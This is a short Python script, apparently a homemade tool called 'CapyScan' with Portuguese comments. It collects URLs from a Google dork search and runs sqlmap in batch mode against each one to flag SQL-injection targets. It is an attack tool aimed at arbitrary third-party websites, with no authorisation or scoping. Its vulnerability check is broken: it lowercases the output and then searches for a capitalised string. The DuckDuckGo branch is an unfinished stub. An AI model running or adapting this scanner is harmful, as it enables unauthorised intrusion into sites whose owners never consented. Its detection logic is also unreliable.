import argparse
from googlesearch import search
import subprocess
from duckduckpy import query

parser = argparse.ArgumentParser(description='CapyScan')
parser.add_argument('-d','--dork', type=str, help='dork a ser procurada', required=True)
parser.add_argument('-n','--num', type=int, help="numero de saidas desejada (padrão: 10)", default=10)
parser.add_argument('-p','--protocolo', type=str, help="filtra apenas http ou tudo(all)", choices=['http','all'],default='all')
parser.add_argument('-Se','--search-engine', type=str, help="define se a busca vai ser pelo google ou duckduckgo", choices=['google','duckduckgo'],default='google')
args = parser.parse_args()

dork = args.dork
num_results = args.num
filter_protocol = args.protocolo
engine = args.search_engine

sites = []
if engine == 'google':
	print("google :")
	for i,url in enumerate(search(args.dork, num_results=num_results)):
		if filter_protocol == 'http' and not url.startswith('http://'):
			continue
		sites.append(url)
		print(f"{i+1}. {url}")

		process = subprocess.run(["sqlmap","-u",url,"--batch"], capture_output=True, text=True)

		output_str = process.stdout.lower()

		if "Type: boolean-based blind" in output_str:
			print("\033[92m"+"++[VUNERAVEL]+---" +url+"\033[0m")
		else:
			print("\033[31m"+"++[NÃO VUNERAVEL]+---" +url+"\033[0m")

	print(f"\nFound {len(sites)} sites for the dork {dork}")
elif engine == 'duckduckgo':
	print("duckduckgo :")


	print("tem q fazer")